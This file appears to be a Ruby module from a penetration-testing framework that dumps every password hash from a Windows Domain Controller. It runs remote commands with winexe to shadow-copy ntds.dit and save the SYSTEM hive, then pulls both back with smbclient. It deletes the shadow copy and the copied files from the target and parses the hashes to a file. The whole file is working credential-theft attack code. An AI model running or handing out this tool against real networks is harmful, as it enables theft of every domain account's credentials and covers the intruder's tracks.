require 'poet'

class Hashesdc < Poet::Scanner
	self.mod_name = "Domain Controller"
	self.description = "Gather hashes from the Domain Controller's NTDS.dit file."
	self.invasive = true
  self.title = "Dumping Domain Controler's NTDS.dit"

	# Print the DCs based on DNS records before host selection
	def initialize
		pdc, dcs = get_dcs
		if pdc and dcs
			dc_list = ""
			dc_list << "PDC: #{pdc}\n" unless pdc.empty?
			dc_list << "DCs: #{dcs.join(' ')}" unless dcs.empty?
			puts dc_list unless dc_list.empty?
		end
		super
	end

	def setup
		puts

		# Normalize drive letter and check validity
		while true
			print "Enter the Drive to save the Shadow Copy and SYS key #{color_banner('[C:]')}: "
			@drive = rgets.upcase
			if @drive =~ /^[A-Z]$/
				@drive = "#{@drive}:"
				break
			elsif @drive =~ /^[A-Z]:$/
				break
			elsif @drive =~ /^[A-Z]:$\\/
				@drive = @drive.chomp("\\")
				 break
			elsif @drive.empty?
				@drive = "C:"
				break
			else
				print_bad("Valid Drive required")
			end
		end

		# Get valid path
		while true
			print "Enter the Path to save the Shadow Copy and SYS key #{color_banner('[\\Windows\\TEMP]')} : "
			@drop_path = rgets
			if @drop_path =~ /^\\/
				break
			elsif @drop_path.empty?
				@drop_path = "\\Windows\\TEMP"
				break
			else
				print_bad("Valid path required")
			end
		end

		# Normalize drive letter and check validity
		while true
			print "Enter the Drive where the NTDS.dit file is #{color_banner('[C:]')}: "
			@ntds_drive = rgets.upcase
			if @ntds_drive =~ /^[A-Z]$/
				@ntds_drive = "#{@drive}:"
				break
			elsif @ntds_drive =~ /^[A-Z]:$/
				break
			elsif @ntds_drive =~ /^[A-Z]:$\\/
				@ntds_drive = @ntds_drive.chomp("\\")
				 break
			elsif @ntds_drive.empty?
				@ntds_drive = "C:"
				break
			else
				print_bad("Valid Drive required")
			end
		end

		# Get valid path
		while true
			print "Enter the Path to the NTDS.dit file #{color_banner('[\\Windows\\NTDS]')} : "
			@ntds = rgets
			if @ntds =~ /^\\$/
				@ntds = ''
				break
			elsif @ntds =~ /^\\/
				break
			elsif @ntds.empty?
				@ntds = "\\Windows\\NTDS"
				break
			else
				print_bad("Valid path required")
			end
		end

		# Disable timeout for this module
		@timeout = 0

		# Check directory structure
		create_folder("#{@log}/hashes") unless folder_exists("#{@log}/hashes")
		@success = {}

	end

	def run(username, password, host)
		smboptions = "--system //#{host}"
		clientoptions = "--system //#{host}/#{@drive.sub(/:/, '$')} -c"
		
		# Check if ntds exists
		if_ntds = winexe(smboptions, "CMD /C IF EXIST #{@ntds_drive}#{@ntds}\\ntds.dit ECHO Success")
		if if_ntds.chomp.eql? "Success"

			# Check if temp folder supplied exists
			if_path = winexe(smboptions, "CMD /C IF EXIST #{@drive}#{@drop_path} ECHO Success")
			if if_path.chomp.eql? "Success"

				# Check if there is enough space on drive
				print_status("Checking if space exists to copy files...")

				space = winexe(smboptions, "CMD /C dir #{@ntds_drive}#{@ntds}\\ntds.dit")

        space.encode!('UTF-8', 'UTF-8', :invalid => :replace, :replace => '')

        free = /Dir\(s\)\s+(.*?)\sbytes free/m.match(space)[1]
				file_size = /File\(s\)\s+(.*?)\s+bytes/m.match(space)[1]
				file_size = file_size.gsub!(/[^0-9]/, '')
				if free.gsub!(/[^0-9]/, '').to_i > file_size.to_i

					# Create Shadow copy
					vss_create = winexe(smboptions, "CMD /C vssadmin create shadow /for=#{@ntds_drive}")
					print_status("Creating shadow copy...")

					# Check if created, get volume name and copy the ntds.dit
					if vss_create =~ /Successfully created shadow copy for/m

						# Rip out id and name for shadow copy
						vss_volume_id = /Shadow Copy ID: ({.*})/.match(vss_create)[1]
						vss_volume_name = /Shadow Copy Volume Name: (.*)\s/.match(vss_create)[1].chomp
					
						# Copy files
 						cmd = "CMD /C copy #{vss_volume_name}#{@ntds}\\ntds.dit #{@drive}#{@drop_path}\\ntds.dit && reg.exe save HKLM\\SYSTEM #{@drive}#{@drop_path}\\sys"
						vss_copy = winexe(smboptions, cmd)

						# If files are copied...
						if vss_copy =~ /1 file\(s\) copied/

							# Local drop point for stolen files
							local_drop = "#{@log}/hashes/#{host}"

							# If module was successful, create hash folder
							unless folder_exists("#{@log}/hashes/#{host}")
								unless create_folder("#{@log}/hashes/#{host}")
									local_drop = "#{@log}/hashes/"
									print_warning("#{host.ljust(15)} - Could not create folder for host #{host}, saving to #{@log}/hashes/")
								end
							end

							ntds_filename = "ntds.dit"
							sys_filename = "sys"

							folder = Time.now.strftime('%m-%d-%Y_%H-%M')

							# Check if files already exist
							backup_file("#{local_drop}/ntds.dit")
							backup_file("#{local_drop}/sys")
							backup_file("#{local_drop}/ntds.dit.export")

							ntdsthread = Thread.new do
								# Copy files to local sysstem
								copy_ntds = smbclient(clientoptions, "get #{@drop_path}\\ntds.dit #{local_drop}/#{ntds_filename}")
							end
							
							print("\e[1;34m[*]\e[0m NTDS.dit percent copied: ")

							# Print percent every five seconds
							progress(file_size, "#{local_drop}/#{ntds_filename}") until ntdsthread.join(1)

							print " Complete"
							puts 

							copy_sys = smbclient(clientoptions, "get #{@drop_path}\\sys #{local_drop}/#{sys_filename}")

							cleanup = false

							# Check for copied files
							if File.exist?("#{local_drop}/#{ntds_filename}")
								print_status("ntds.dit copied to #{local_drop}/#{ntds_filename}")
							else
								print_bad("#{host.ljust(15)} - ntds.dit was not copied")
								cleanup = true
							end

							if File.exist?("#{local_drop}/#{sys_filename}")
								print_status("sys copied to #{local_drop}/#{sys_filename}")
							else
								print_bad("#{host.ljust(15)} - sys was not copied")
								cleanup = true
							end

							# Delete shadow copy
							print_status("Deleting shadow copy id #{vss_volume_id}...")
							vss_del = winexe(smboptions, "CMD /C vssadmin delete shadows /shadow=#{vss_volume_id} /quiet")

							# Make sure to delete files from victim
							print_status("Deleting copied files from #{@drive}#{@drop_path}...")
							cmd = "CMD /C DEL #{@drive}#{@drop_path}\\ntds.dit && del #{@drive}#{@drop_path}\\sys"
							delete = winexe(smboptions, cmd)

							# Cleanup and return if there was a failure
							return nil if cleanup

							# Give users a chance to do it manually later since it can take multiple hours to complete
							@extract_ntds = ''
							until @extract_ntds.eql? 'y' or @extract_ntds.eql? 'n'
								print_status ("Extraction can take mutiple hours, do you want to continue the process? [#{color_banner('y')}|#{color_banner('n')}]")
								@extract_ntds = rgets.downcase
							end

							#if @extract_ntds.eql? 'y'
								print_status("Exporting NTDS file contents, this might take a while...")
	
								esedump_cmd = "#{Menu.extbin[:esedbexport]} -l #{@log}/hashes/#{host}/esedbexport.log -t #{local_drop}/ntds.dit #{local_drop}/#{ntds_filename}"
								esedump = log(esedump_cmd) { `#{esedump_cmd}` }

								# If export worked
								if esedump =~ /Export completed\./
									print_status("Parsing ntds.dit file...")

									# Get filenames
									datatable = /Exporting table (\d) \(datatable\) out of \d+\./.match(esedump)[1]
									linktable = /Exporting table (\d) \(link_table\) out of \d+\./.match(esedump)[1]
									datatable = "#{local_drop}/ntds.dit\.export/datatable\.#{datatable.to_i - 1}"
									linktable = "#{local_drop}/ntds.dit\.export/link_table\.#{linktable.to_i - 1}"
								
									dsusers = ''
									capture_stderr {
									# Parse with dsusers
										dsusers = `python #{Menu.extbin[:dsusers]} #{datatable} #{linktable} --passwordhashes #{local_drop}/#{sys_filename} --passwordhistory #{local_drop}/#{sys_filename} --pwdformat ocl --lmoutfile #{host}.lm --ntoutfile #{host}.nt`
									}
									# Write output to temp file, doesn't currently support stdin
									begin
										File.open("#{local_drop}/dsusers.txt", 'w') { |file| file.write(dsusers) }
									rescue
										print_bad("Could not write to #{local_drop}/dsusers.txt")
										return nil
									end
									ntdspwdump = `python #{Menu.extbin[:ntdspwdump]} #{local_drop}/dsusers.txt`

									# Write final output to file 									
									@parsed_hashes =  "#{@log}/hashes/#{host}_DC_dump.txt"

									# If results aren't nil
									if ntdspwdump
									print_status("Removing blank hashes...")
									
									# Remove lines that contain emtpy hashes
									empty_hash = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
									ntdspwdump = ntdspwdump.split("\n").delete_if {|line| line.strip.eql? empty_hash }
									ntdspwdump = ntdspwdump.join("\n")
									
									# Get number of hashes
									@success[host] = ntdspwdump.lines.count

									print_status("Saving hashes to #{@parsed_hashes}...")

									# Save hashes to file
									begin
										File.open(@parsed_hashes, 'w') { |file| file.write(ntdspwdump) }
									rescue
										print_warning("Could not write to #{@parsed_hashes}")
										print_warning("Try manually parsing the #{local_drop}/dsusers.txt file with ntdspwdump.py")
										return nil
									end

									print_good("#{host.ljust(15)} - Hash dump successful, #{highlight(ntdspwdump.lines.count)} hashes dumped")
								else
									print_bad("#{host.ljust(15)} - NTDS parse output appears to be empty...")
								end
							else
								print_bad("#{host.ljust(15)} - Could not parse the ntds.dit, try manually parsing #{local_drop}/ntds.dit")
								return nil									
							end
						else
							print_bad("#{host.ljust(15)} - Could not create Volumn Shadow Copy")
							return nil
						end
					else
						print_bad("#{host.ljust(15)} - Could not create Volumn Shadow Copy")
						return nil		
					end
				else
					print_bad("#{host.ljust(15)} - Not enough space on disk to copy")
					return nil
				end
			else
				print_bad("#{host.ljust(15)} - The path provided does not exist.")
				return nil
			end
		else
			print_bad("#{host.ljust(15)} - The ntds.dit file does not exist in the path provided.")
			return nil
		end
	end
#end
	# Print progress on download
	def progress(size, file)
		print '.'
		sleep 1.5
		print '.'
		sleep 1.5
		print '.'
		sleep 1.5
		percent =  (File.size? file).to_f / size.to_f
		percent = percent * 100
		percent = ((percent*20).round / 20.0)
		print "\e[1;37m#{percent}\e[0m%"
	end

	def finish
		# Put ending titles
		uniq_hashes = 0
		@success.each_value {|v| uniq_hashes = uniq_hashes += v}

		puts "\nDomain Hashes Dumped: #{highlight(uniq_hashes)}\n" 
		puts "Hashes are located at: #{@parsed_hashes}\n" if @parsed_hashes
		puts

		# Return to menu
		print "Press enter to Return to Dumping Hashes Menu"
		gets
	end
end
